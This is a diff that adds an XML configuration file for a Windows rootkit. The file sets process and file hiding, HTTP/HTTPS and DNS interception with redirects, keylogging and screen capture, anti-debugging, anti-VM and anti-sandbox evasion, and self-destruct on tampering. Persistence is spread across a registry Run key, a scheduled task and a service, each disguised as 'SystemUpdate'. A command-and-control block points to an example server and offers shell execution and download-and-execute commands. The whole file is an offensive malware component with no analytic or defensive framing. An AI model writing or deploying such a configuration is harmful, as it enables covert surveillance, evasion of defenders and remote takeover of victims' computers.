@@ -1,0 +1,183 @@
+<RkConfig>
+    <GeneralSettings>
+        <Enable>true</Enable>
+        <StealthMode>true</StealthMode>
+        <LoggingLevel>verbose</LoggingLevel>
+        <UpdateInterval>60</UpdateInterval> <!-- Interval in seconds for checking updates -->
+        <Encryption>
+            <Enable>true</Enable>
+            <Algorithm>AES-256</Algorithm>
+            <Key>your-encryption-key-here</Key>
+        </Encryption>
+    </GeneralSettings>
+    <ProcessHiding>
+        <Enable>true</Enable>
+        <Processes>
+            <Process>
+                <Name>notepad.exe</Name>
+                <PID>1234</PID>
+            </Process>
+            <Process>
+                <Name>calc.exe</Name>
+                <PID>5678</PID>
+            </Process>
+        </Processes>
+    </ProcessHiding>
+    <FileHiding>
+        <Enable>true</Enable>
+        <Files>
+            <File>
+                <Path>C:\HiddenFolder\ImInside.txt</Path>
+            </File>
+            <File>
+                <Path>C:\AnotherHiddenFolder\confidential.docx</Path>
+            </File>
+        </Files>
+    </FileHiding>
+    <NetworkInterception>
+        <Enable>true</Enable>
+        <InterceptedPorts>
+            <Port>80</Port>
+            <Port>443</Port>
+        </InterceptedPorts>
+        <PacketFiltering>
+            <Enable>true</Enable>
+            <Rules>
+                <Rule>
+                    <Protocol>TCP</Protocol>
+                    <SourceIP>159.24.1.100</SourceIP>
+                    <DestinationIP>203.0.113.5</DestinationIP> <!-- Example IP -->
+                    <SourcePort>any</SourcePort>
+                    <DestinationPort>443</DestinationPort>
+                    <Action>allow</Action>
+                </Rule>
+                <Rule>
+                    <Protocol>UDP</Protocol>
+                    <SourceIP>102.33.45.1</SourceIP>
+                    <DestinationIP>203.0.113.6</DestinationIP> <!-- Example IP -->
+                    <SourcePort>53</SourcePort>
+                    <DestinationPort>any</DestinationPort>
+                    <Action>deny</Action>
+                </Rule>
+            </Rules>
+        </PacketFiltering>
+        <DNSInterception>
+            <Enable>true</Enable>
+            <InterceptedDomains>
+                <Domain>
+                    <Name>example.com</Name>
+                    <RedirectIP>203.0.113.200</RedirectIP> <!-- Example IP -->
+                </Domain>
+                <Domain>
+                    <Name>testsite.org</Name>
+                    <RedirectIP>203.0.113.201</RedirectIP> <!-- Example IP -->
+                </Domain>
+            </InterceptedDomains>
+        </DNSInterception>
+    </NetworkInterception>
+    <KeyLogging>
+        <Enable>false</Enable>
+        <LogFilePath>C:\Logs\keylog.txt</LogFilePath>
+        <KeyCombinationLogging>true</KeyCombinationLogging>
+        <ScreenCapture>
+            <Enable>true</Enable>
+            <CaptureInterval>300</CaptureInterval> <!-- Interval in seconds -->
+            <SavePath>C:\Logs\screenshots\</SavePath>
+        </ScreenCapture>
+    </KeyLogging>
+    <SelfDefense>
+        <AntiDebugging>true</AntiDebugging>
+        <AntiVM>true</AntiVM>
+        <AntiSandbox>true</AntiSandbox>
+        <AntiRootkitDetection>
+            <Enable>true</Enable>
+            <Techniques>
+                <Technique>
+                    <Name>HookDetection</Name>
+                    <Enabled>true</Enabled>
+                </Technique>
+                <Technique>
+                    <Name>MemoryScrambling</Name>
+                    <Enabled>true</Enabled>
+                </Technique>
+            </Techniques>
+        </AntiRootkitDetection>
+        <IntegrityCheck>
+            <Enable>true</Enable>
+            <CheckInterval>120</CheckInterval> <!-- Interval in seconds -->
+            <Actions>
+                <Action>
+                    <Type>Alert</Type>
+                    <Message>Integrity check failed!</Message>
+                </Action>
+                <Action>
+                    <Type>SelfDestruct</Type>
+                    <Enable>true</Enable>
+                </Action>
+            </Actions>
+        </IntegrityCheck>
+    </SelfDefense>
+    <Persistence>
+        <Enable>true</Enable>
+        <Techniques>
+            <Technique>
+                <Name>RegistryKey</Name>
+                <Enabled>true</Enabled>
+                <Path>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</Path>
+                <ValueName>SystemUpdate</ValueName>
+                <ExecutablePath>C:\Windows\System32\sysupdate.exe</ExecutablePath>
+            </Technique>
+            <Technique>
+                <Name>ScheduledTask</Name>
+                <Enabled>true</Enabled>
+                <TaskName>SystemUpdate</TaskName>
+                <ExecutablePath>C:\Windows\System32\sysupdate.exe</ExecutablePath>
+                <Schedule>daily</Schedule>
+                <Time>02:00</Time>
+            </Technique>
+            <Technique>
+                <Name>ServiceInstallation</Name>
+                <Enabled>true</Enabled>
+                <ServiceName>SystemUpdateService</ServiceName>
+                <ServiceDescription>Service to maintain system updates</ServiceDescription>
+                <ExecutablePath>C:\Windows\System32\sysupdate.exe</ExecutablePath>
+            </Technique>
+            <Technique>
+                <Name>BootLoaderModification</Name>
+                <Enabled>false</Enabled> <!-- Use with caution -->
+                <ExecutablePath>C:\Windows\System32\bootmod.exe</ExecutablePath>
+            </Technique>
+        </Techniques>
+    </Persistence>
+    <CommandAndControl>
+        <Enable>true</Enable>
+        <ServerURL>http://198.51.100.1</ServerURL> <!-- Example IP -->
+        <CheckInInterval>300</CheckInInterval> <!-- Interval in seconds -->
+        <Commands>
+            <Command>
+                <Name>UpdateConfig</Name>
+                <Description>Update rootkit configuration</Description>
+            </Command>
+            <Command>
+                <Name>ExecuteShell</Name>
+                <Description>Execute shell command</Description>
+            </Command>
+            <Command>
+                <Name>DownloadAndExecute</Name>
+                <Description>Download and execute file</Description>
+                <Parameters>
+                    <Parameter>
+                        <Name>URL</Name>
+                        <Type>String</Type>
+                        <Description>URL of the file to download</Description>
+                    </Parameter>
+                    <Parameter>
+                        <Name>SavePath</Name>
+                        <Type>String</Type>
+                        <Description>Path to save the downloaded file</Description>
+                    </Parameter>
+                </Parameters>
+            </Command>
+        </Commands>
+    </CommandAndControl>
+</RkConfig>
